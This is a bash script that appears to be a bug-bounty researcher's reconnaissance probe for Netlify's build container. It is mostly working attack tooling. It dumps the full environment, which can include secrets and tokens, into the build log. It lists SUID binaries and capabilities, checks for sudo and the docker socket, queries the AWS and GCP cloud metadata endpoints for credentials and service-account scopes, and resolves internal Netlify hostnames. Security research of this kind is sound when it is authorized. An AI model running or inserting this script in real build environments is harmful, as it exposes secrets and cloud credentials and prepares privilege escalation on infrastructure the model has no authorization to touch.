#!/usr/bin/env bash
# H1 build-container recon (read-only; RoE-clean: no DoS, no writes, low-and-slow).
# Purpose: map what the Netlify build container exposes, and whether it can reach
# cloud metadata / infra credentials BEYOND my own site. Output goes to the build log
# (my own deploy), which I read back via the Netlify API. Researcher: abedalaziz123sayed.
set +e
echo "=====H1RECON_START====="
echo "## identity"; id; whoami; uname -a
echo "## container"; cat /proc/1/cgroup 2>/dev/null | head; echo "--self--"; cat /proc/self/cgroup 2>/dev/null | head
echo "## host/net"; hostname; (hostname -I 2>/dev/null || true); (ip -o addr 2>/dev/null | head || true); (ip route 2>/dev/null | head || true)
echo "## env_keys_only"; env | cut -d= -f1 | sort
echo "## env_full"; env | sort
echo "## home"; echo "HOME=$HOME"; ls -la "$HOME" 2>/dev/null | head -40
echo "## root_fs"; ls -la / 2>/dev/null
echo "## opt_buildhome"; ls -la /opt 2>/dev/null; ls -la /opt/buildhome 2>/dev/null | head -40
echo "## sudo"; sudo -n true 2>&1 && echo SUDO_YES || echo SUDO_NO
echo "## suid"; find / -perm -4000 -type f 2>/dev/null | head -40
echo "## caps"; (cat /proc/self/status 2>/dev/null | grep -i cap || true)
echo "## docker_sock"; ls -la /var/run/docker.sock 2>/dev/null || echo no-docker-sock
echo "## aws_imds_v1"; curl -s --max-time 4 http://169.254.169.254/latest/meta-data/ 2>&1 | head -30
echo "## aws_imds_v2_token_len"; T=$(curl -s --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null); echo "len=${#T}"
echo "## gcp_metadata"; curl -s --max-time 4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/ 2>&1 | head -30
echo "## gcp_sa_scopes"; curl -s --max-time 4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes 2>&1 | head
echo "## netlify_internal_dns"; for h in nf-server-api.services-prod.nsvcs.net functions-origin-api.services-prod.nsvcs.net api.netlify.com; do echo "-- $h"; (getent hosts "$h" 2>/dev/null | head -2 || true); done
echo "=====H1RECON_END====="
